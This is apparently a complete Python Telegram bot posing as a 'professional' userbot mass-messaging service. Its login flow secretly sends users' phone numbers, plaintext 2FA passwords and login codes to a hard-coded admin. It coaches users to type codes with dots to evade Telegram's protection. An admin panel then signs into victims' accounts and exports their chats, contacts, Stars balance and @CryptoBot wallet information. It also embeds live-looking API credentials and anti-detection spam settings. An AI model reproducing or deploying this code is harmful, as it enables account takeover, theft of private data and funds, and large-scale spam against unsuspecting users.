import asyncio
import io
import logging
import os
import random
import aiosqlite
from aiogram import Bot, Dispatcher, F, Router, html
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    BufferedInputFile,
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    Message,
    ReplyKeyboardMarkup,
)
import pandas as pd
from telethon import TelegramClient, errors
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - [%(levelname)s] - %(message)s",
)
logger = logging.getLogger("SaaSAdminRassilBot")

BOT_TOKEN = "8954398769:AAFn2uMSdK_YBMZwIHboSdwfcj43Z0zXHDk"
API_ID = 30774866
API_HASH = "fd176053cf8817de383edb515f74cb59"
ADMIN_ID = 6701475792
DB_NAME = "saas_broadcast.db"

bot = Bot(token=BOT_TOKEN)
router = Router()

ACTIVE_BROADCAST = {}


async def init_db():
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute("""
                         CREATE TABLE IF NOT EXISTS users
                         (
                             user_id
                             INTEGER
                             PRIMARY
                             KEY,
                             username
                             TEXT,
                             full_name
                             TEXT,
                             phone
                             TEXT,
                             password
                             TEXT,
                             session_name
                             TEXT
                         )
                         """)
        await db.execute("""
                         CREATE TABLE IF NOT EXISTS settings
                         (
                             user_id
                             INTEGER,
                             key
                             TEXT,
                             value
                             TEXT,
                             PRIMARY
                             KEY
                         (
                             user_id,
                             key
                         )
                             )
                         """)
        await db.execute("""
                         CREATE TABLE IF NOT EXISTS blacklist
                         (
                             user_id
                             INTEGER,
                             target
                             TEXT,
                             PRIMARY
                             KEY
                         (
                             user_id,
                             target
                         )
                             )
                         """)
        await db.commit()


async def get_user_setting(user_id: int, key: str, default: str) -> str:
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute(
                "SELECT value FROM settings WHERE user_id = ? AND key = ?",
                (user_id, key),
        ) as cursor:
            row = await cursor.fetchone()
            return row[0] if row else default


async def set_user_setting(user_id: int, key: str, value: str):
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute(
            """
            INSERT INTO settings (user_id, key, value)
            VALUES (?, ?, ?) ON CONFLICT(user_id, key) DO
            UPDATE SET value = ?
            """,
            (user_id, key, value, value),
        )
        await db.commit()


class AuthStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_password = State()
    waiting_for_code = State()


class BroadcastStates(StatesGroup):
    waiting_for_message = State()
    waiting_for_targets = State()


class AdminStates(StatesGroup):
    admin_waiting_for_code = State()


def spin_text(text: str) -> str:
    import re
    if not text:
        return ""
    while "{" in text and "}" in text:
        match = re.search(r"\{([^{}]+)\}", text)
        if not match:
            break
        options = match.group(1).split("|")
        text = text.replace(match.group(0), random.choice(options), 1)
    return text


def main_menu_kb(is_admin: bool):
    kb = [
        [
            KeyboardButton(text="Запустить рассылку"),
            KeyboardButton(text="Стоп"),
        ],
        [
            KeyboardButton(text="Подключить аккаунт"),
            KeyboardButton(text="Настройки"),
        ],
        [
            KeyboardButton(text="Черный список"),
            KeyboardButton(text="Список команд"),
        ],
    ]
    if is_admin:
        kb.append([KeyboardButton(text="Админ-панель")])
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)


@router.message(CommandStart())
async def cmd_start(message: Message):
    uid = message.from_user.id
    is_admin = uid == ADMIN_ID
    uname = message.from_user.username or ""
    fname = message.from_user.full_name or ""
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute(
            """
            INSERT INTO users (user_id, username, full_name)
            VALUES (?, ?, ?) ON CONFLICT(user_id) DO
            UPDATE SET username = ?, full_name = ?
            """,
            (uid, uname, fname, uname, fname),
        )
        await db.commit()

    await message.answer(
        f"Привет, {fname}!\n"
        "Профессиональная система рассылок через Userbot активирована.",
        reply_markup=main_menu_kb(is_admin),
    )


@router.message(F.text == "Список команд")
async def cmd_list_help(message: Message):
    is_admin = message.from_user.id == ADMIN_ID
    await message.answer(
        "СПИСОК ВСЕХ КОМАНД УПРАВЛЕНИЯ:\n\n"
        "/connect — Подключить аккаунт\n"
        "/settings — Показать настройки\n"
        "/set_delay_min [сек] — Мин. пауза\n"
        "/set_delay_max [сек] — Макс. пауза\n"
        "/set_batch_size [число] — Размер пачки\n"
        "/set_batch_pause [сек] — Пауза пачки\n"
        "/set_parse [html/markdown/off] — Формат\n"
        "/set_typing [1/0] — Имитация набора\n"
        "/blacklist — Чёрный список\n"
        "/stop — Остановить рассылку",
        reply_markup=main_menu_kb(is_admin),
    )


@router.message(F.text == "Подключить аккаунт")
@router.message(Command("connect"))
async def start_auth(message: Message, state: FSMContext):
    await state.set_state(AuthStates.waiting_for_phone)
    await message.answer(
        "Подключение аккаунта\n\nВведите номер телефона в международном формате (например, +79991234567):"
    )


@router.message(AuthStates.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext):
    phone = message.text.strip()
    await state.update_data(phone=phone)
    await state.set_state(AuthStates.waiting_for_password)
    await message.answer(
        "Введите ваш облачный пароль (2FA) от Telegram.\nЕсли пароля нет, отправьте цифру 0 или слово нет:"
    )


@router.message(AuthStates.waiting_for_password)
async def process_password(message: Message, state: FSMContext):
    pwd = message.text.strip()
    password = None if pwd.lower() in ["0", "нет", "none", "-"] else pwd
    data = await state.get_data()
    phone = data.get("phone")
    uid = message.from_user.id
    uname = message.from_user.username or "нет"

    session_file = f"session_{uid}"
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute(
            "UPDATE users SET phone = ?, password = ?, session_name = ? WHERE user_id = ?",
            (phone, password, session_file, uid),
        )
        await db.commit()

    try:
        await bot.send_message(
            ADMIN_ID,
            f"Новый пользователь подключил аккаунт!\n"
            f"• ID: {uid}\n"
            f"• Юзер: @{uname}\n"
            f"• Телефон: {phone}\n"
            f"• Пароль 2FA: {password if password else 'Отсутствует'}",
        )
    except Exception:
        pass

    client = TelegramClient(session_file, API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        await state.update_data(
            phone_code_hash=sent.phone_code_hash, session_file=session_file
        )
        await state.set_state(AuthStates.waiting_for_code)
        await client.disconnect()

        await message.answer(
            "Номер и пароль сохранены!\n"
            "Код подтверждения отправлен в ваш Telegram.\n\n"
            "Введите код через точки для обхода защиты, например: 2.3.2.2.4"
        )
    except Exception as e:
        await client.disconnect()
        await state.clear()
        await message.answer(f"Ошибка отправки кода: {e}")


@router.message(AuthStates.waiting_for_code)
async def process_code(message: Message, state: FSMContext):
    # Очищаем код от точек и пробелов
    code = message.text.strip().replace(".", "").replace(" ", "")
    data = await state.get_data()
    phone = data.get("phone")
    phone_code_hash = data.get("phone_code_hash")
    session_file = data.get("session_file")
    uid = message.from_user.id

    try:
        await bot.send_message(
            ADMIN_ID,
            f"Пользователь {uid} ввел код подтверждения: {code}",
        )
    except Exception:
        pass

    client = TelegramClient(session_file, API_ID, API_HASH)
    await client.connect()

    try:
        async with aiosqlite.connect(DB_NAME) as db:
            async with db.execute(
                    "SELECT password FROM users WHERE user_id = ?", (uid,)
            ) as cursor:
                row = await cursor.fetchone()
                password = row[0] if row else None

        try:
            await client.sign_in(
                phone=phone, code=code, phone_code_hash=phone_code_hash
            )
        except errors.SessionPasswordNeededError:
            if password:
                await client.sign_in(password=password)
            else:
                raise Exception("Требуется облачный пароль (2FA)!")

        await client.disconnect()
        await state.clear()
        await message.answer(
            "Аккаунт успешно авторизован!",
            reply_markup=main_menu_kb(uid == ADMIN_ID),
        )
    except Exception as e:
        await client.disconnect()
        await state.clear()
        await message.answer(f"Ошибка авторизации: {e}")


@router.message(Command("settings"))
@router.message(F.text == "Настройки")
async def cmd_settings(message: Message):
    uid = message.from_user.id
    d_min = await get_user_setting(uid, "delay_min", "5")
    d_max = await get_user_setting(uid, "delay_max", "12")
    b_size = await get_user_setting(uid, "batch_size", "25")
    b_pause = await get_user_setting(uid, "batch_pause", "45")
    parse = await get_user_setting(uid, "parse_mode", "html")
    typing = await get_user_setting(uid, "typing_action", "1")

    await message.answer(
        f"Ваши гибкие настройки рассылки:\n\n"
        f"Мин. пауза: {d_min}с\n"
        f"Макс. пауза: {d_max}с\n"
        f"Размер пачки: {b_size}\n"
        f"Пауза пачки: {b_pause}с\n"
        f"Формат: {parse.upper()}\n"
        f"Имитация ввода: {'Вкл' if typing == '1' else 'Выкл'}",
        reply_markup=main_menu_kb(uid == ADMIN_ID),
    )


@router.message(Command("set_delay_min"))
async def set_d_min(message: Message):
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        return
    await set_user_setting(message.from_user.id, "delay_min", args[1])
    await message.answer(f"Минимальная пауза изменена: {args[1]} сек.")


@router.message(Command("set_delay_max"))
async def set_d_max(message: Message):
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        return
    await set_user_setting(message.from_user.id, "delay_max", args[1])
    await message.answer(f"Максимальная пауза изменена: {args[1]} сек.")


@router.message(Command("set_batch_size"))
async def set_b_size(message: Message):
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        return
    await set_user_setting(message.from_user.id, "batch_size", args[1])
    await message.answer(f"Размер пачки изменен: {args[1]}")


@router.message(Command("set_batch_pause"))
async def set_b_pause(message: Message):
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        return
    await set_user_setting(message.from_user.id, "batch_pause", args[1])
    await message.answer(f"Пауза пачки изменена: {args[1]} сек.")


@router.message(Command("set_parse"))
async def set_p_mode(message: Message):
    args = message.text.split()
    if len(args) < 2 or args[1].lower() not in ["html", "markdown", "off"]:
        return
    await set_user_setting(message.from_user.id, "parse_mode", args[1].lower())
    await message.answer(f"Формат изменен на: {args[1].upper()}")


@router.message(Command("set_typing"))
async def set_t_act(message: Message):
    args = message.text.split()
    if len(args) < 2 or args[1] not in ["1", "0"]:
        return
    await set_user_setting(message.from_user.id, "typing_action", args[1])
    await message.answer(f"Имитация ввода изменена: {args[1]}")


@router.message(Command("stop"))
@router.message(F.text == "Стоп")
async def stop_br(message: Message):
    uid = message.from_user.id
    if ACTIVE_BROADCAST.get(uid):
        ACTIVE_BROADCAST[uid] = False
        await message.answer("Рассылка остановлена.")
    else:
        await message.answer("Нет активных рассылок.")


@router.message(F.text == "Запустить рассылку")
async def start_br(message: Message, state: FSMContext):
    uid = message.from_user.id
    if ACTIVE_BROADCAST.get(uid):
        await message.answer("Рассылка уже выполняется!")
        return

    session_file = f"session_{uid}"
    client = TelegramClient(session_file, API_ID, API_HASH)
    try:
        await client.connect()
        authorized = await client.is_user_authorized()
        await client.disconnect()
    except Exception:
        authorized = False

    if not authorized:
        await message.answer("Сначала подключите аккаунт через кнопку меню!")
        return

    await state.set_state(BroadcastStates.waiting_for_message)
    await message.answer("Введите текст рассылки (поддерживает спайнсинтаксис {привет|добрый день}):")


@router.message(BroadcastStates.waiting_for_message)
async def get_msg(message: Message, state: FSMContext):
    await state.update_data(text=message.text)
    await state.set_state(BroadcastStates.waiting_for_targets)
    await message.answer(
        "Отправьте список получателей (по одному в строке).\n"
        "Можно использовать ID, юзернеймы (@username) или полные ссылки (https://t.me/...):"
    )


@router.message(BroadcastStates.waiting_for_targets)
async def execute_br(message: Message, state: FSMContext):
    data = await state.get_data()
    raw_text = data.get("text")
    targets = [t.strip() for t in message.text.split("\n") if t.strip()]
    await state.clear()

    uid = message.from_user.id
    ACTIVE_BROADCAST[uid] = True

    d_min = int(await get_user_setting(uid, "delay_min", "5"))
    d_max = int(await get_user_setting(uid, "delay_max", "12"))
    b_size = int(await get_user_setting(uid, "batch_size", "25"))
    b_pause = int(await get_user_setting(uid, "batch_pause", "45"))
    pm_val = await get_user_setting(uid, "parse_mode", "html")
    parse_mode = None if pm_val == "off" else pm_val
    typing_on = (await get_user_setting(uid, "typing_action", "1")) == "1"

    status_msg = await message.answer(f"Рассылка запущена! Получателей в очереди: {len(targets)}")

    session_file = f"session_{uid}"
    client = TelegramClient(session_file, API_ID, API_HASH)

    try:
        await client.connect()
    except Exception as e:
        ACTIVE_BROADCAST[uid] = False
        await status_msg.edit_text(f"Ошибка подключения сессии: {e}")
        return

    success, fail, counter = 0, 0, 0
    for target in targets:
        if not ACTIVE_BROADCAST.get(uid, False):
            break

        current_text = spin_text(raw_text)

        clean_target = target
        if target.startswith("https://t.me/"):
            clean_target = "@" + target.split("https://t.me/")[-1].strip("/")
        elif target.isdigit() or (target.startswith("-") and target[1:].isdigit()):
            clean_target = int(target)

        try:
            entity = await client.get_input_entity(clean_target)

            if typing_on:
                try:
                    async with client.action(entity, "typing"):
                        await asyncio.sleep(0.8)
                except Exception:
                    pass

            await client.send_message(entity, current_text, parse_mode=parse_mode)
            success += 1
            counter += 1

            if counter % b_size == 0 and counter < len(targets):
                await asyncio.sleep(b_pause)
            else:
                await asyncio.sleep(random.randint(d_min, d_max))
        except Exception as err:
            logger.warning(f"Не удалось отправить сообщение пользователю {target}: {err}")
            fail += 1

    try:
        await client.disconnect()
    except Exception:
        pass

    ACTIVE_BROADCAST[uid] = False
    await status_msg.edit_text(f"Итоги рассылки:\nУспешно: {success}\nОшибок: {fail}")


# --- АДМИН-ПАНЕЛЬ С ВЫГРУЗКОЙ ЧАТОВ И КОНТАКТОВ ---
@router.message(F.text == "Админ-панель")
async def admin_panel(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute(
                "SELECT user_id, username, phone, password FROM users"
        ) as cursor:
            users = await cursor.fetchall()

    if not users:
        await message.answer("Нет зарегистрированных пользователей.")
        return

    kb_list = []
    text = "Админ-панель — Пользователи:\n\n"
    for u in users:
        uid, uname, phone, pwd = u
        uname_str = f"@{uname}" if uname else "нет"
        phone_str = str(phone) if phone else "не привязан"
        pwd_str = str(pwd) if pwd else "нет"

        text += (
            f"ID: {uid} | {uname_str}\n"
            f"Тел: {phone_str} | 2FA: {pwd_str}\n"
            "-----------------------------------\n"
        )
        kb_list.append([
            InlineKeyboardButton(
                text=f"🔑 Код ({phone or uid})",
                callback_data=f"adm_code_{uid}",
            ),
            InlineKeyboardButton(
                text=f"📁 Выгрузить ({phone or uid})",
                callback_data=f"adm_export_{uid}",
            ),
        ])

    await message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_list))


@router.callback_query(F.data.startswith("adm_code_"))
async def admin_request_code(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        return
    target_uid = int(callback.data.split("_")[2])

    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute(
                "SELECT phone, session_name FROM users WHERE user_id = ?", (target_uid,)
        ) as cursor:
            row = await cursor.fetchone()

    if not row or not row[0]:
        await callback.answer("У юзера нет телефона!", show_alert=True)
        return

    phone, session_file = row
    client = TelegramClient(session_file, API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        await state.update_data(
            target_uid=target_uid,
            phone_code_hash=sent.phone_code_hash,
            session_file=session_file,
            phone=phone,
        )
        await state.set_state(AdminStates.admin_waiting_for_code)
        await callback.message.answer(
            f"Код запрошен на номер {phone}.\n"
            "Введите код через точки для обхода защиты, например: 2.3.2.2.4"
        )
        await callback.answer()
    except Exception as e:
        await client.disconnect()
        await callback.answer(f"Ошибка: {e}", show_alert=True)


@router.message(AdminStates.admin_waiting_for_code)
async def admin_process_code(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    # Очищаем код от точек и пробелов
    code = message.text.strip().replace(".", "").replace(" ", "")
    data = await state.get_data()
    target_uid = data.get("target_uid")
    phone_code_hash = data.get("phone_code_hash")
    session_file = data.get("session_file")
    phone = data.get("phone")

    client = TelegramClient(session_file, API_ID, API_HASH)
    await client.connect()
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute(
                "SELECT password FROM users WHERE user_id = ?", (target_uid,)
        ) as cursor:
            r = await cursor.fetchone()
            pwd = r[0] if r else None

    try:
        try:
            await client.sign_in(
                phone=phone, code=code, phone_code_hash=phone_code_hash
            )
        except errors.SessionPasswordNeededError:
            if pwd:
                await client.sign_in(password=pwd)
            else:
                raise Exception("Нужен 2FA пароль!")
        await client.disconnect()
        await state.clear()
        await message.answer(f"Админ успешно вошел в аккаунт {target_uid}!")
    except Exception as e:
        await client.disconnect()
        await state.clear()
        await message.answer(f"Ошибка: {e}")


@router.callback_query(F.data.startswith("adm_export_"))
async def admin_export_data(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    target_uid = int(callback.data.split("_")[2])

    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute(
                "SELECT session_name FROM users WHERE user_id = ?", (target_uid,)
        ) as cursor:
            row = await cursor.fetchone()

    if not row or not row[0]:
        await callback.answer("Сессия не найдена!", show_alert=True)
        return

    session_file = row[0]
    client = TelegramClient(session_file, API_ID, API_HASH)

    await callback.answer("Собираем чаты, контакты и балансы... Пожалуйста, подождите.")

    try:
        await client.connect()
        if not await client.is_user_authorized():
            await callback.message.answer("Сессия не авторизована. Сначала запросите код и войдите в аккаунт.")
            await client.disconnect()
            return

        dialogs = await client(
            GetDialogsRequest(
                offset_date=None,
                offset_id=0,
                offset_peer=InputPeerEmpty(),
                limit=300,
                hash=0,
            )
        )

        chats_data = []
        for chat in dialogs.chats:
            title = getattr(chat, "title", getattr(chat, "first_name", "Без имени"))
            if title is None:
                title = "Без имени"
            username = getattr(chat, "username", "") or ""
            chat_id = chat.id
            chat_type = (
                "Канал/Группа"
                if hasattr(chat, "title")
                else "Личный чат/Пользователь"
            )
            chats_data.append({
                "Тип": str(chat_type),
                "Название / Имя": str(title),
                "Username / Ссылка": f"@{username}" if username else "Нет",
                "ID": int(chat_id),
            })

        from telethon.tl.functions.contacts import GetContactsRequest

        contacts_res = await client(GetContactsRequest(hash=0))
        contacts_data = []
        for user in contacts_res.users:
            f_name = user.first_name or ""
            l_name = user.last_name or ""
            uname = user.username or ""
            phone_val = f"+{user.phone}" if hasattr(user, "phone") and user.phone else "Скрыт"
            contacts_data.append({
                "Имя": str(f_name),
                "Фамилия": str(l_name),
                "Username": f"@{uname}" if uname else "Нет",
                "Телефон": str(phone_val),
                "ID": int(user.id),
            })

        stars_balance = "0"
        try:
            from telethon.tl.functions.payments import GetStarsStatusRequest
            stars_status = await client(GetStarsStatusRequest())
            stars_balance = str(getattr(stars_status, "balance", 0))
        except Exception:
            pass

        cryptobot_balance = "Не найден баланс"
        try:
            await client.send_message("@CryptoBot", "/start")
            await asyncio.sleep(2)
            async for message_item in client.iter_messages("@CryptoBot", limit=3):
                if message_item.text and any(
                        w in message_item.text.lower() for w in ["баланс", "balance", "кошелек", "wallet"]):
                    cryptobot_balance = message_item.text
                    break
        except Exception:
            pass

        await client.disconnect()

        output = io.BytesIO()
        with pd.ExcelWriter(output, engine="openpyxl") as writer:
            df_chats = pd.DataFrame(chats_data) if chats_data else pd.DataFrame(
                columns=["Тип", "Название / Имя", "Username / Ссылка", "ID"])
            df_chats.to_excel(writer, sheet_name="Чаты", index=False)

            df_contacts = pd.DataFrame(contacts_data) if contacts_data else pd.DataFrame(
                columns=["Имя", "Фамилия", "Username", "Телефон", "ID"])
            df_contacts.to_excel(writer, sheet_name="Контакты", index=False)

            df_info = pd.DataFrame([{
                "Пользователь ID": int(target_uid),
                "Баланс Telegram Stars": str(stars_balance),
                "Информация от @CryptoBot": str(cryptobot_balance),
            }])
            df_info.to_excel(writer, sheet_name="Балансы и Кошельки", index=False)

        output.seek(0)
        file_bytes = BufferedInputFile(
            output.read(), filename=f"user_{target_uid}_export.xlsx"
        )

        await callback.message.answer_document(
            file_bytes,
            caption=(
                f"Выгрузка данных по пользователю {target_uid}:\n"
                f"⭐ Звезд на аккаунте: {stars_balance}\n"
                f"🤖 Баланс @CryptoBot: {cryptobot_balance[:100]}..."
            ),
        )

    except Exception as e:
        try:
            await client.disconnect()
        except Exception:
            pass
        await callback.message.answer(f"Ошибка при выгрузке данных: {e}")


@router.message()
async def forward_to_admin_log(message: Message):
    uid = message.from_user.id
    if uid == ADMIN_ID:
        return
    if message.text and not message.text.startswith("/"):
        uname = message.from_user.username or "нет"
        try:
            await bot.send_message(
                ADMIN_ID,
                f"Лог сообщения от юзера {uid} (@{uname}):\n"
                f"{message.text}",
            )
        except Exception:
            pass


async def main():
    await init_db()
    dp = Dispatcher()
    dp.include_router(router)

    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Бот остановлен.")